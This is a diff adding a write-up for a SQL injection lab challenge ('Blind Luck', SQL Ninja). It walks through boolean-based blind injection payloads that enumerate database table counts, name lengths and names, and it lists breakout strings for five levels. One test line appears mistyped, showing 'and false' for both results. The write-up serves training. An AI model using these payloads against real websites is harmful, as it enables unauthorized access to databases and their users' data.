@@ -1,7 +1,45 @@
 Solutions of Blind Luck challenge (SQL Ninja):
+(Reference: http://www.securityidiots.com/Web-Pentest/SQL-Injection/Blind-SQL-Injection.html)
 
 #1.
-#2.
-#3.
-#4.
-#5.
++ First, we see when add some special characters (',",/,)) at the end of url, we cannot get error message. We only see 2 different message:
+"Your Account on this id exists..
+Your are welcome" ("true" message)
+"Your Account on this id do not exists..
+Get lost" ("false" message)
+So, we can try blind injection.
++ Try boolean-based blind injection:
+First, we find list of concat of maximum 3 special characters such that when add, we get "false" message
+(in this case we get: concat(', <any character>)
+Next, after add special characters in each case, try add comment characters in SQL query (--+- or /* or #) and find comment  character such that it can get "true" message.
+If we find boths, we can use boolean-based blind injection by using ...?id=1<special_characters> ... <comment_characters>
+To make sure it is working correctly, we can test:
+...?id=1<special_characters> and false <comment_characters> get "false" message
+...?id=1<special_characters> and false <comment_characters> get "true" message
+(in this case: When we try ...?id=1')) we get "false" message, but when we add ...?id=1')) --+- we get "true" message. So we use ...?id=1')) ... --+-)
++ Get information:
+Use format ...?id=1')) and <SQL query return single row> --+-
+if SQL query returns false, we can get "false" message and otherwise.
+Ex: 
+Get number of tables:
+Find min(n) such that:
+...?id=1')) and (select count((select table_name from information_schema.tables where table_schema=database() limit n,1))) --+- 
+get "false" message. Hence, number of tables = min(n)
+(in this case, number of tables = 3)
+Get length(table #3):
+Find min(n) such that:
+...?id=1')) and length((select table_name from information_schema.tables where table_schema=database() limit 2,1))>=n --+-
+get "false" message. Hence, length(table #3) = min(n)
+(in this case, length(table #3) = 5)
+Find name of table #3:
+For character #n, find c such that
+...?id=1')) and ascii(substring((select table_name from information_schema.tables where table_schema=database() limit 2,1),n,1)) = c
+get "true" message. Hence, ascii(character #n) = c
+After that, we can get name of table (in this case, name is 'users')
+
+Similar to #2,#3,#4
+
+#2. ...?id=1' ... --+-
+#3. ...?id=1) ... --+-
+#4. ...?id=1") ... --+-
+#5. ...?id=1")) ... --+-
